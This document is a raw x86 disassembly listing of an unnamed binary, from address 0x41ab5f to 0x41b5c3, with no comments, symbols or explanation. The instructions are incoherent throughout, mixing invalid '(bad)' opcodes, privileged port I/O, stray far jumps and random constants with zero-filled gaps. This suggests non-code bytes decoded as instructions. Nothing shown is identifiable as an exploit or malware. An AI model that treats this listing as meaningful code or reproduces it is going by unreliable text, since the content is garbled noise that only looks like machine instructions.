  41ab5f:	mov    esp,0xc92db2a3
  41ab64:	lea    ebx,[edx+0x6c]
  41ab67:	inc    ecx
  41ab68:	ins    BYTE PTR es:[edi],dx
  41ab69:	das    
  41ab6a:	cs ret 
  41ab6c:	gs push es
  41ab6e:	jne    0x41ab79
  41ab70:	daa    
  41ab71:	clc    
  41ab72:	mov    bl,0xae
  41ab74:	into   
  41ab75:	and    eax,0xf4507d98
  41ab7a:	ins    DWORD PTR es:[edi],dx
  41ab7b:	mov    eax,ds:0x5d075c96
  41ab80:	sub    DWORD PTR [ebx+0x4f5d7716],0x19e04c03
  41ab8a:	pop    eax
  41ab8b:	xchg   BYTE PTR ds:0x9a1e2d06,dh
  41ab91:	xchg   edx,eax
  41ab92:	xor    al,0x66
  41ab94:	pop    esp
  41ab95:	sbb    dl,BYTE PTR [edi+edi*1-0x5cd99a11]
  41ab9c:	dec    edx
  41ab9d:	outs   dx,DWORD PTR ds:[esi]
  41ab9e:	inc    ecx
  41ab9f:	std    
  41aba0:	loope  0x41ab2c
  41aba2:	push   cs
  41aba3:	test   al,0xf5
  41aba5:	and    ch,BYTE PTR cs:[ebx]
  41aba8:	cmp    al,0x51
  41abaa:	ins    BYTE PTR es:[edi],dx
  41abab:	adc    dh,cl
  41abad:	inc    esp
  41abae:	out    0xca,al
  41abb0:	ins    DWORD PTR es:[edi],dx
  41abb1:	(bad)  
  41abb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abb3:	inc    edi
  41abb4:	fisttp DWORD PTR ds:0x7b88fdd6
  41abba:	sub    eax,edi
  41abbc:	loopne 0x41abfa
  41abbe:	stos   BYTE PTR es:[edi],al
  41abbf:	or     al,0xd
  41abc1:	aad    0x79
  41abc3:	mov    cl,0xba
  41abc5:	xor    bh,BYTE PTR [ecx-0x35e59202]
  41abcb:	out    dx,eax
  41abcc:	loop   0x41ab89
  41abce:	lds    ebx,FWORD PTR [esi+0x6c4ce972]
  41abd4:	fcomp  QWORD PTR [edi+edi*8+0x39b1cb1]
  41abdb:	xor    al,0x77
  41abdd:	mov    esp,0x4c3834ba
  41abe2:	or     ah,dl
  41abe4:	bound  eax,QWORD PTR [esp+esi*4-0x52]
  41abe8:	inc    edx
  41abe9:	stc    
  41abea:	int    0x10
  41abec:	sub    DWORD PTR [ecx],ecx
  41abee:	js     0x41abf9
  41abf0:	retf   0x9a95
  41abf3:	int3   
  41abf4:	pop    esi
  41abf5:	out    0x4b,eax
  41abf7:	push   ecx
  41abf8:	mov    ecx,0x9d9645a5
  41abfd:	shl    esp,0x23
  41ac00:	in     eax,0xa7
  41ac02:	in     al,dx
  41ac03:	mov    bh,BYTE PTR [eax+esi*1-0x17]
  41ac07:	jmp    0x41ac77
  41ac09:	xor    al,BYTE PTR [edi]
  41ac0b:	adc    edi,edx
  41ac0d:	fcom   st(4)
  41ac0f:	jo     0x41ac77
  41ac11:	dec    esi
  41ac12:	adc    eax,0x4771794b
  41ac17:	out    0x4e,eax
  41ac19:	jmp    0xdd8e6de7
  41ac1e:	jle    0x41ac0b
  41ac20:	xor    eax,0x58b31247
  41ac25:	adc    eax,0x537d01d
  41ac2a:	arpl   WORD PTR [ebp+0x5ca3684a],dx
  41ac30:	enter  0xc429,0x2b
  41ac34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac35:	loope  0x41ac40
  41ac37:	jbe    0x41ac63
  41ac39:	inc    ebx
  41ac3a:	add    DWORD PTR [esp+edx*1],esp
  41ac3d:	test   al,0x87
  41ac3f:	aaa    
  41ac40:	imul   ebx,DWORD PTR [ebx+0x0],0x0
	...
  41acb3:	add    al,dh
  41acb5:	xchg   edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0x29227602
  41acc3:	pop    edx
  41acc4:	push   ss
  41acc5:	and    al,BYTE PTR [ecx]
  41acc7:	add    dh,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    BYTE PTR [ebx],al
  41accd:	or     al,0x48
  41accf:	mov    al,ds:0xb56595e0
  41acd4:	push   ds
  41acd5:	bound  ecx,QWORD PTR [esi]
  41acd7:	test   DWORD PTR [edi],0xf14caad3
  41acdd:	aaa    
  41acde:	arpl   bx,cx
  41ace0:	pushf  
  41ace1:	pop    ds
  41ace2:	into   
  41ace3:	push   ss
  41ace4:	cdq    
  41ace5:	sahf   
  41ace6:	(bad)  
  41ace7:	mov    ecx,esp
  41ace9:	fnstsw WORD PTR [ecx+0x29]
  41acec:	mov    ebp,0xfbc98fbd
  41acf1:	es ja  0x41ad12
  41acf4:	out    dx,eax
  41acf5:	out    0x8f,al
  41acf7:	out    dx,al
  41acf8:	stc    
  41acf9:	mov    ds:0x8a628792,al
  41acfe:	and    eax,0xf1586db2
  41ad03:	mov    dh,0x6d
  41ad05:	push   eax
  41ad06:	jno    0x41acc9
  41ad08:	or     DWORD PTR [ebx+0x4f92ec73],edi
  41ad0e:	pop    eax
  41ad0f:	fldcw  WORD PTR [ebp+0x7f]
  41ad12:	adc    DWORD PTR [ebx],edi
  41ad14:	dec    edi
  41ad15:	into   
  41ad16:	setp   BYTE PTR [eax+0x5c]
  41ad1a:	push   0xc188a62c
  41ad1f:	and    eax,0x914fa26c
  41ad24:	mov    ds:0x32248482,eax
  41ad29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad2a:	xor    esi,ebp
  41ad2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad2d:	in     al,0x57
  41ad2f:	push   ebp
  41ad30:	mov    edx,0xc0b2e71b
  41ad35:	div    DWORD PTR gs:[edx-0x5495125d]
  41ad3c:	int    0xba
  41ad3e:	ret    0xda46
  41ad41:	(bad)  
  41ad43:	imul   ebp,esi,0xd9310e27
  41ad49:	jmp    0x4d12eead
  41ad4e:	int3   
  41ad4f:	adc    ebx,ebp
  41ad51:	(bad)  
  41ad52:	pop    ds
  41ad53:	jbe    0x41adbc
  41ad55:	mov    al,0x75
  41ad57:	bound  edx,QWORD PTR [ebp-0x257b8bd1]
  41ad5d:	jmp    0xebd31d91
  41ad62:	pop    ss
  41ad63:	sub    BYTE PTR [edx-0x4f9e2c6a],cl
  41ad69:	lock ffreep st(0)
  41ad6c:	ss inc ebx
  41ad6e:	pop    edi
  41ad6f:	lods   eax,DWORD PTR ds:[esi]
  41ad70:	mov    edi,DWORD PTR [ebp-0x64]
  41ad73:	mov    bh,0x4a
  41ad75:	xchg   DWORD PTR [edx],ecx
  41ad77:	xor    esi,DWORD PTR [edi]
  41ad79:	xchg   ebp,eax
  41ad7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad7b:	retf   0x4081
  41ad7e:	test   DWORD PTR [ecx+0x76e7f2ea],edx
  41ad84:	mov    WORD PTR [edx],es
  41ad86:	pop    es
  41ad87:	jge    0x41add0
  41ad89:	cdq    
  41ad8a:	ror    DWORD PTR [ebx],cl
  41ad8c:	jmp    FWORD PTR [edx]
  41ad8e:	test   DWORD PTR [eax],edx
  41ad90:	jp     0x41ad84
  41ad92:	and    DWORD PTR [eax],ecx
  41ad94:	inc    esp
  41ad95:	shl    BYTE PTR [esi],cl
  41ad97:	xchg   ebp,eax
  41ad98:	rcr    BYTE PTR [ecx],0x38
  41ad9b:	stos   DWORD PTR es:[edi],eax
  41ad9c:	xor    BYTE PTR [ebx+0x79],0x1c
  41ada0:	das    
  41ada1:	cmp    ebx,DWORD PTR [esi+0x19814457]
  41ada7:	mov    DWORD PTR [eax],ecx
  41ada9:	mov    WORD PTR [esi],gs
  41adab:	xor    BYTE PTR [ebx+edx*8-0x64],bh
  41adaf:	cmp    ebx,esi
  41adb1:	xor    edi,edx
  41adb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb4:	mov    al,ds:0x62f5b5ce
  41adb9:	jb     0x41adbe
  41adbb:	ja     0x41ae28
  41adbd:	aad    0xf
  41adbf:	loopne 0x41adf3
  41adc1:	push   cs
	...
  41ae32:	add    BYTE PTR [eax],al
  41ae34:	xchg   eax,ebx
  41ae36:	pop    ss
  41ae37:	lds    ebx,FWORD PTR [edi-0x31]
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi+0x4577741d]
  41ae41:	sbb    BYTE PTR [ebp+0x1230cd4],bh
  41ae47:	add    dh,dh
  41ae49:	add    BYTE PTR [eax],al
  41ae4b:	add    BYTE PTR [edx+0x70],bh
  41ae4e:	dec    ebx
  41ae4f:	fld    QWORD PTR [ebx+0x138d4b88]
  41ae55:	das    
  41ae56:	xor    al,0x9c
  41ae58:	(bad)  
  41ae59:	gs jnp 0x41ae60
  41ae5c:	sahf   
  41ae5d:	cmp    eax,0x2e898158
  41ae62:	pop    esi
  41ae63:	scas   al,BYTE PTR es:[edi]
  41ae64:	xchg   esp,eax
  41ae65:	arpl   WORD PTR [edi+0x1da8f8da],ax
  41ae6b:	xor    eax,0x70cdd56d
  41ae70:	pop    ecx
  41ae71:	xchg   BYTE PTR [edx+0x39248594],ch
  41ae77:	push   ebx
  41ae78:	ins    BYTE PTR es:[edi],dx
  41ae79:	ss addr16 call 0x530a9968
  41ae80:	out    dx,al
  41ae81:	add    DWORD PTR [esi],esi
  41ae83:	js     0x41ae3f
  41ae85:	or     eax,0xad350802
  41ae8a:	call   0xceff:0x26ada946
  41ae91:	retf   
  41ae92:	std    
  41ae93:	aaa    
  41ae94:	inc    eax
  41ae95:	or     edi,0x5ac28a09
  41ae9b:	cdq    
  41ae9c:	jg     0x41aebc
  41ae9e:	cli    
  41ae9f:	adc    al,0x15
  41aea1:	pop    ecx
  41aea2:	jmp    0x41ae4d
  41aea4:	cmp    BYTE PTR [edi+0x4b],al
  41aea7:	mov    eax,ds:0x8296aa13
  41aeac:	stos   BYTE PTR es:[edi],al
  41aead:	adc    eax,0xa218c78c
  41aeb2:	fisttp WORD PTR [ebx+eax*8]
  41aeb5:	imul   edx,DWORD PTR [esi-0x69910c76],0x5d
  41aebc:	pop    ecx
  41aebd:	fidiv  WORD PTR [esp+eiz*2-0x14675351]
  41aec4:	or     ebx,ebp
  41aec6:	mov    ebx,0x4caa0c16
  41aecb:	aam    0x28
  41aecd:	sub    ecx,ebp
  41aecf:	cs test eax,0xeffa189f
  41aed5:	ret    
  41aed6:	bound  ecx,QWORD PTR [ebp-0x37]
  41aed9:	jg     0x41ae70
  41aedb:	aas    
  41aedc:	int3   
  41aedd:	pop    ss
  41aede:	pop    ecx
  41aedf:	fcom   DWORD PTR [edx+0x11]
  41aee2:	and    BYTE PTR [esi+0x71210d28],ch
  41aee8:	xor    al,ch
  41aeea:	mov    bh,0xb4
  41aeec:	nop
  41aeed:	push   ebx
  41aeee:	push   ebx
  41aeef:	std    
  41aef0:	enter  0x8883,0x40
  41aef4:	repz iret 
  41aef6:	inc    ecx
  41aef7:	sub    BYTE PTR ds:0x8c3654df,ah
  41aefd:	jns    0x41aeac
  41aeff:	ins    BYTE PTR es:[edi],dx
  41af00:	test   DWORD PTR [ebx-0x4e999bba],edx
  41af06:	jns    0x41aee0
  41af08:	cdq    
  41af09:	jg     0x41af15
  41af0b:	inc    ebx
  41af0c:	sub    BYTE PTR [edi+edi*4],bl
  41af0f:	xchg   ebx,eax
  41af10:	push   0x6dda1d18
  41af15:	sub    al,0x65
  41af17:	jecxz  0x41aee7
  41af19:	jne    0x41af33
  41af1b:	ins    BYTE PTR es:[edi],dx
  41af1c:	pop    ds
  41af1d:	sbb    edi,DWORD PTR [edi]
  41af1f:	dec    ecx
  41af20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af21:	lods   eax,DWORD PTR ds:[esi]
  41af22:	adc    dl,BYTE PTR [ebp+0x5]
  41af25:	xchg   ebx,eax
  41af26:	cld    
  41af27:	minps  xmm5,xmm5
  41af2a:	and    ebp,edi
  41af2c:	jp     0x41af6a
  41af2e:	dec    edx
  41af2f:	xchg   edx,eax
  41af30:	sbb    BYTE PTR [ebx],cl
  41af32:	mov    edi,0xb027eae5
  41af37:	outs   dx,BYTE PTR ds:[esi]
  41af38:	sbb    eax,0xca066e97
  41af3d:	push   ds
  41af3e:	adc    dh,BYTE PTR [eax+0x7a]
  41af41:	pusha  
	...
  41afb2:	add    BYTE PTR [eax],al
  41afb4:	dec    esi
  41afb5:	jmp    0x41afe1
  41afb7:	dec    esi
  41afb8:	scas   eax,DWORD PTR es:[edi]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x91
  41afc1:	cmp    DWORD PTR [edx-0x1e],ebx
  41afc4:	add    ah,BYTE PTR [ecx+eax*1]
  41afc7:	add    dh,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [ebx-0x29],bh
  41afce:	das    
  41afcf:	cmp    eax,0xd67f7215
  41afd4:	mov    db7,ebp
  41afd7:	lods   eax,DWORD PTR ds:[esi]
  41afd8:	outs   dx,BYTE PTR ds:[esi]
  41afd9:	mov    ecx,0x422bc901
  41afde:	popa   
  41afdf:	mov    BYTE PTR [eax],cl
  41afe1:	jl     0x41b051
  41afe3:	mov    dl,0xe0
  41afe5:	sbb    eax,0x24705b22
  41afea:	loope  0x41aff1
  41afec:	inc    edi
  41afed:	pop    ecx
  41afee:	(bad)  
  41afef:	bound  edi,QWORD PTR [esi+0x7c9c1aed]
  41aff5:	das    
  41aff6:	sub    esi,DWORD PTR [edi-0xf4b6bf9]
  41affc:	mov    dl,bl
  41affe:	out    0x12,al
  41b000:	gs cdq 
  41b002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b003:	fdiv   DWORD PTR [ebp-0x5c52307a]
  41b009:	jl     0x41b04c
  41b00b:	xchg   ebx,eax
  41b00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b00d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b00e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00f:	pop    edi
  41b010:	xlat   BYTE PTR ds:[ebx]
  41b011:	hlt    
  41b012:	add    cl,BYTE PTR [esi+0x5bc13fe3]
  41b018:	int3   
  41b019:	or     BYTE PTR [ecx-0x3b],bh
  41b01c:	retf   
  41b01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b01e:	repnz mov ebp,0x3906e10
  41b024:	lods   eax,DWORD PTR ds:[esi]
  41b025:	in     al,dx
  41b026:	shl    BYTE PTR [ecx-0x34b905c],cl
  41b02c:	imul   ebp,DWORD PTR [ecx],0xffffff97
  41b02f:	ins    BYTE PTR es:[edi],dx
  41b030:	push   0xc4a983d3
  41b035:	xchg   edx,eax
  41b036:	je     0x41b055
  41b038:	inc    ebp
  41b03a:	dec    edi
  41b03b:	mov    edx,0xa1cc2537
  41b040:	das    
  41b041:	add    DWORD PTR ss:[esp+eiz*4+0x64],esp
  41b046:	aaa    
  41b047:	adc    bh,dl
  41b049:	js     0x41b09b
  41b04b:	or     DWORD PTR [ebx-0x6e54eaa8],ebp
  41b051:	mov    bl,0xd1
  41b053:	mov    al,ds:0x27b7e94d
  41b058:	rcl    DWORD PTR [eax+ebp*8+0x40],0xd
  41b05d:	mov    ah,0xc3
  41b05f:	dec    edi
  41b060:	mov    bh,0xc1
  41b062:	les    ebx,FWORD PTR [ecx+ebp*2]
  41b065:	rcr    BYTE PTR [esi-0x6710bc51],cl
  41b06b:	neg    BYTE PTR [edi]
  41b06d:	inc    esp
  41b06e:	sahf   
  41b06f:	lds    ebx,FWORD PTR [esi+edx*4+0x4338e851]
  41b076:	pop    ecx
  41b077:	xchg   ebx,eax
  41b078:	retf   0xef3a
  41b07b:	or     esi,edi
  41b07d:	int3   
  41b07e:	jecxz  0x41b00d
  41b080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b081:	sbb    DWORD PTR [esi-0x1f9b9b6c],edi
  41b087:	sbb    DWORD PTR [edx],0x52855569
  41b08d:	add    DWORD PTR [esi+0x42a27b09],edi
  41b093:	mov    eax,ds:0x6641e31a
  41b098:	das    
  41b099:	test   al,0xec
  41b09b:	jo     0x41b098
  41b09d:	sub    DWORD PTR [edx+eiz*2-0x28],0x68bb82a7
  41b0a5:	ins    DWORD PTR es:[edi],dx
  41b0a6:	xor    eax,0x70ade89
  41b0ab:	sahf   
  41b0ac:	(bad)  
  41b0ad:	gs sub esp,edx
  41b0b0:	rcl    BYTE PTR [ebp+0x2b],cl
  41b0b3:	in     al,0x28
  41b0b5:	retf   0xd41c
  41b0b8:	mov    ds:0xa858ec37,al
  41b0bd:	in     al,0xaa
  41b0bf:	aam    0x1c
  41b0c1:	mov    edx,0x0
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	push   ds
  41b141:	push   eax
  41b142:	or     cl,BYTE PTR [eax]
  41b144:	clc    
  41b145:	and    al,0x1
  41b147:	add    dh,dh
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    BYTE PTR ds:0x7a992c9f,dh
  41b151:	iret   
  41b152:	dec    ebx
  41b153:	push   es
  41b154:	and    al,0xbe
  41b156:	sub    ecx,eax
  41b158:	xchg   esi,eax
  41b159:	jg     0x41b1ac
  41b15b:	fdivr  st(7),st
  41b15d:	push   es
  41b15e:	xchg   edi,eax
  41b15f:	or     eax,0xce1ce8b8
  41b164:	inc    esp
  41b165:	inc    esp
  41b166:	xchg   BYTE PTR [eax],bl
  41b168:	jge    0x41b123
  41b16a:	jge    0x41b1e5
  41b16c:	mov    al,0x72
  41b16e:	jae    0x41b17f
  41b170:	fprem1 
  41b172:	inc    esp
  41b173:	int3   
  41b174:	mov    ebp,DWORD PTR [esi-0x6f2fbc15]
  41b17a:	test   al,0xd
  41b17c:	mov    cl,0xb1
  41b17e:	push   ebp
  41b17f:	lahf   
  41b180:	call   0x5225:0x53841a82
  41b187:	push   edx
  41b188:	pop    eax
  41b189:	into   
  41b18a:	popf   
  41b18b:	push   ds
  41b18c:	dec    BYTE PTR ds:0x9f67443f
  41b192:	push   ecx
  41b193:	dec    edx
  41b194:	(bad)  
  41b196:	mov    ah,0x74
  41b198:	(bad)
  41b19c:	jl     0x41b1ac
  41b19e:	add    ch,ch
  41b1a0:	jge    0x41b142
  41b1a2:	push   ebp
  41b1a3:	push   es
  41b1a4:	mov    bp,0x3d30
  41b1a8:	mov    DWORD PTR [edi+0x3a],esi
  41b1ab:	data16 mov ah,0xb
  41b1ae:	ret    0xf483
  41b1b1:	stos   BYTE PTR es:[edi],al
  41b1b2:	fldenv [ebx-0x1d455a10]
  41b1b8:	neg    esi
  41b1ba:	aad    0x8
  41b1bc:	pop    esp
  41b1bd:	imul   edx,ebx,0xb0b3a49a
  41b1c3:	xor    BYTE PTR [edi],cl
  41b1c5:	jmp    0x41b21b
  41b1c7:	scas   al,BYTE PTR es:[edi]
  41b1c8:	loop   0x41b16f
  41b1ca:	xor    ebp,DWORD PTR [ecx]
  41b1cc:	dec    esp
  41b1cd:	pushf  
  41b1ce:	pop    edx
  41b1cf:	sbb    eax,0x105a9bd6
  41b1d4:	jge    0x41b190
  41b1d6:	xchg   edi,eax
  41b1d7:	sbb    DWORD PTR [edi+0x57f8fd2a],ecx
  41b1dd:	push   edi
  41b1de:	sub    BYTE PTR [eax+eax*4],dh
  41b1e1:	push   es
  41b1e2:	push   edx
  41b1e3:	imul   ecx,eax,0xbb7659d1
  41b1e9:	retf   0x96d4
  41b1ec:	sub    eax,0x26f4a95d
  41b1f1:	leave  
  41b1f2:	sub    bl,al
  41b1f4:	cmp    BYTE PTR [ecx+0x229acfd7],bh
  41b1fa:	(bad)  
  41b1fb:	lock pop es
  41b1fd:	and    DWORD PTR [esi-0x77],0xf6ce5caf
  41b204:	xchg   ecx,eax
  41b205:	rcl    BYTE PTR [edx*4+0x2c7ba49b],cl
  41b20c:	gs sysret 
  41b20f:	mov    esi,0xd5de7f34
  41b214:	dec    ebx
  41b215:	and    BYTE PTR [ebx],0x39
  41b218:	jns    0x41b243
  41b21a:	nop
  41b21b:	das    
  41b21c:	jmp    0x41b1cc
  41b21e:	and    eax,0x9ad41065
  41b223:	dec    ebx
  41b224:	out    0x20,al
  41b226:	lock retf 0x1b21
  41b22a:	repz mov bh,0x62
  41b22d:	xchg   edx,eax
  41b22e:	jle    0x41b1b3
  41b230:	xchg   ecx,eax
  41b231:	xor    BYTE PTR [ecx],ch
  41b233:	adc    eax,0x7b7dd33a
  41b238:	add    DWORD PTR [edx],0x65eccd81
  41b23e:	jnp    0x41b266
  41b240:	std    
  41b241:	push   ss
	...
  41b2b2:	add    BYTE PTR [eax],al
  41b2b4:	neg    DWORD PTR [eax-0x58]
  41b2b7:	adc    ebp,DWORD PTR [edi+0x3afcfff3]
  41b2bd:	out    dx,eax
  41b2be:	jl     0x41b2c7
  41b2c0:	fst    QWORD PTR [ebx+0x25eee7bd]
  41b2c6:	add    DWORD PTR [eax],eax
  41b2c8:	test   BYTE PTR [eax],0x0
  41b2cb:	add    dh,al
  41b2cd:	mov    esi,0x20267d9a
  41b2d2:	lds    eax,FWORD PTR [edi]
  41b2d4:	jmp    0x4238:0x4eaa074a
  41b2db:	inc    ebx
  41b2dc:	mov    ebp,0xdd529c5e
  41b2e1:	std    
  41b2e2:	push   ss
  41b2e3:	stos   BYTE PTR es:[edi],al
  41b2e4:	das    
  41b2e5:	std    
  41b2e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e7:	push   ds
  41b2e8:	pop    esp
  41b2e9:	in     al,dx
  41b2ea:	and    al,BYTE PTR [ecx+0x0]
  41b2ed:	in     eax,dx
  41b2ee:	xor    DWORD PTR [eax+ebp*1-0x1],ecx
  41b2f2:	xchg   esp,eax
  41b2f3:	cmp    eax,0x263ad569
  41b2f8:	mov    bh,0xb8
  41b2fa:	scas   al,BYTE PTR es:[edi]
  41b2fb:	sbb    al,BYTE PTR [esp+ebp*4]
  41b2fe:	jnp    0x41b31e
  41b300:	sub    DWORD PTR [ecx],esp
  41b302:	xor    BYTE PTR [edx+0xc960d21],cl
  41b308:	jmp    0x41b2e8
  41b30a:	pushf  
  41b30b:	mov    BYTE PTR [edx],bh
  41b30d:	adc    DWORD PTR [edx],ebx
  41b30f:	cmp    al,0xdd
  41b311:	ret    0x5814
  41b314:	xor    BYTE PTR [ecx+edi*8-0x1b],dh
  41b318:	mov    al,ds:0xd2d72739
  41b31d:	mov    dh,0x59
  41b31f:	in     al,dx
  41b320:	or     ah,BYTE PTR [ebx+0x5661c53f]
  41b326:	fisubr DWORD PTR [edx]
  41b328:	jmp    0x41b2f7
  41b32a:	rcl    BYTE PTR [ecx+0x44b1ac01],cl
  41b330:	ss mov eax,0x9c0b1bd3
  41b336:	aas    
  41b337:	dec    edx
  41b338:	outs   dx,BYTE PTR ds:[esi]
  41b339:	(bad)  
  41b33a:	mov    ds:0x132bb343,al
  41b33f:	lock jge 0x41b388
  41b342:	or     bh,BYTE PTR [ebx-0x2f]
  41b345:	mov    esi,0xe5c57126
  41b34a:	add    eax,0xe2f6f873
  41b34f:	ja     0x41b384
  41b351:	adc    si,0x6ded
  41b356:	sbb    cl,BYTE PTR [edi+0x204d3afd]
  41b35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b35d:	repnz outs dx,BYTE PTR ds:[esi]
  41b35f:	jb     0x41b37d
  41b361:	int    0x6b
  41b363:	and    esp,DWORD PTR [esi]
  41b365:	pop    es
  41b366:	imul   edi,DWORD PTR [ecx+0x6229380],0x7ee60857
  41b370:	pop    esp
  41b371:	sbb    cl,BYTE PTR [ebx-0x15745459]
  41b377:	push   ss
  41b378:	adc    al,0x68
  41b37a:	jg     0x41b349
  41b37c:	aad    0x4
  41b37e:	call   DWORD PTR [ebx+0x14bde3d0]
  41b384:	pop    ebp
  41b385:	(bad)  
  41b386:	(bad)  
  41b388:	mov    al,cs:0x562ce20c
  41b38e:	ficom  DWORD PTR [edi+0x769cf979]
  41b394:	retf   
  41b395:	xor    cl,dl
  41b397:	mov    esp,0xf275bb10
  41b39c:	lods   al,BYTE PTR ds:[esi]
  41b39d:	out    0x2b,al
  41b39f:	xchg   BYTE PTR [eax],cl
  41b3a1:	inc    ebx
  41b3a2:	push   cs
  41b3a3:	mov    eax,ds:0xc9554ac5
  41b3a8:	in     al,0x7c
  41b3aa:	push   0xffffffa5
  41b3ac:	test   DWORD PTR ss:[eax+0x7e],ebp
  41b3b0:	mov    BYTE PTR [edi-0x65fd9f8f],dl
  41b3b6:	dec    edx
  41b3b7:	stos   DWORD PTR es:[edi],eax
  41b3b8:	jo     0x41b39c
  41b3ba:	pop    ds
  41b3bb:	stos   BYTE PTR es:[edi],al
  41b3bc:	(bad)  
  41b3bd:	jnp    0x41b3c3
  41b3bf:	sbb    al,0xa5
  41b3c1:	jecxz  0x41b3c3
	...
  41b433:	add    BYTE PTR [edi-0xf0307e],bh
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	mov    esp,0xe4e6c755
  41b445:	add    DWORD PTR es:[eax],eax
  41b448:	test   BYTE PTR [eax],0x0
  41b44b:	add    BYTE PTR [ebp-0x1ffc8ef9],bh
  41b451:	pop    eax
  41b452:	push   edi
  41b453:	inc    edx
  41b454:	retf   0xf071
  41b457:	je     0x41b4d4
  41b459:	out    dx,al
  41b45a:	mov    BYTE PTR ds:[ebp-0x61],dl
  41b45e:	dec    si
  41b460:	stos   BYTE PTR es:[edi],al
  41b461:	or     BYTE PTR [edx],al
  41b463:	ret    0x4d48
  41b466:	loop   0x41b4b4
  41b468:	cwde   
  41b469:	imul   ecx,ecx,0x1a63b11b
  41b46f:	mov    bh,0xc6
  41b471:	pop    esp
  41b472:	lea    esp,[eax-0x333f7208]
  41b478:	inc    edi
  41b479:	stos   DWORD PTR es:[edi],eax
  41b47a:	jge    0x41b4b1
  41b47c:	stos   BYTE PTR es:[edi],al
  41b47d:	out    dx,al
  41b47e:	jo     0x41b4f7
  41b480:	lock jno 0x41b501
  41b483:	repz xchg esp,eax
  41b485:	pminub mm1,QWORD PTR [edi+eiz*1+0x7b]
  41b48a:	into   
  41b48b:	cwde   
  41b48c:	mov    ds:0x3b395431,al
  41b491:	in     eax,dx
  41b492:	ret    0x75c4
  41b495:	and    eax,0xdf2888a3
  41b49a:	es adc al,0xf0
  41b49d:	add    dh,bh
  41b49f:	pop    ss
  41b4a0:	repnz into 
  41b4a2:	sub    dh,BYTE PTR [edi+eax*2-0x3b]
  41b4a6:	or     ch,BYTE PTR [ecx-0x4]
  41b4a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4aa:	outs   dx,DWORD PTR ds:[esi]
  41b4ab:	sbb    eax,0x8c164dd2
  41b4b0:	dec    edi
  41b4b1:	add    al,0x40
  41b4b3:	or     DWORD PTR [esi+edx*2-0xa079dd0],esi
  41b4ba:	mov    ds:0x22ef9e53,eax
  41b4bf:	(bad)  
  41b4c1:	loope  0x41b4a3
  41b4c3:	test   DWORD PTR [esi+0x66f7afa9],eax
  41b4c9:	pop    ebp
  41b4ca:	sbb    dl,cl
  41b4cc:	add    BYTE PTR [esi+0x49],ah
  41b4cf:	dec    esp
  41b4d0:	jbe    0x41b4e0
  41b4d2:	cmp    eax,0xf7c0b1ad
  41b4d7:	in     eax,0x56
  41b4d9:	aaa    
  41b4da:	lods   al,BYTE PTR ds:[esi]
  41b4db:	pop    ss
  41b4dc:	inc    edx
  41b4dd:	iret   
  41b4de:	mov    ds:0x9bf7c5fe,al
  41b4e3:	out    dx,eax
  41b4e4:	repnz inc ebx
  41b4e6:	sti    
  41b4e7:	(bad)
  41b4eb:	frstor [edx+esi*1-0x788f9f02]
  41b4f2:	mov    cs,ebp
  41b4f4:	add    BYTE PTR [esi+0x78],bl
  41b4f7:	aas    
  41b4f8:	jo     0x41b520
  41b4fa:	xor    eax,0x4948f35c
  41b4ff:	or     eax,0x7679e1bc
  41b504:	popa   
  41b505:	xchg   ebx,eax
  41b506:	mov    ds:0x56d3d2b6,eax
  41b50b:	cmp    ebp,ebx
  41b50d:	mov    ebx,esi
  41b50f:	mov    bh,0x66
  41b511:	sahf   
  41b512:	shl    BYTE PTR [ebx],1
  41b514:	or     bh,BYTE PTR [esi+0x5e]
  41b517:	push   ds
  41b518:	(bad)  
  41b519:	call   FWORD PTR [edi]
  41b51b:	daa    
  41b51c:	sahf   
  41b51d:	dec    ebx
  41b51e:	sbb    eax,0x2264815c
  41b523:	mov    bh,0x4f
  41b525:	mov    ch,0xa4
  41b527:	jne    0x41b4ae
  41b529:	sub    al,0x49
  41b52b:	iret   
  41b52c:	mov    ds:0x1d41718b,eax
  41b531:	ds aas 
  41b533:	arpl   ax,di
  41b535:	in     eax,0x4a
  41b537:	mov    bl,0x27
  41b539:	call   0x101b08e6
  41b53e:	cmp    BYTE PTR [ecx],al
  41b540:	and    ch,0x0
	...
  41b5b3:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x54
  41b5c1:	in     eax,dx
  41b5c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5c3:	xchg   esp,eax
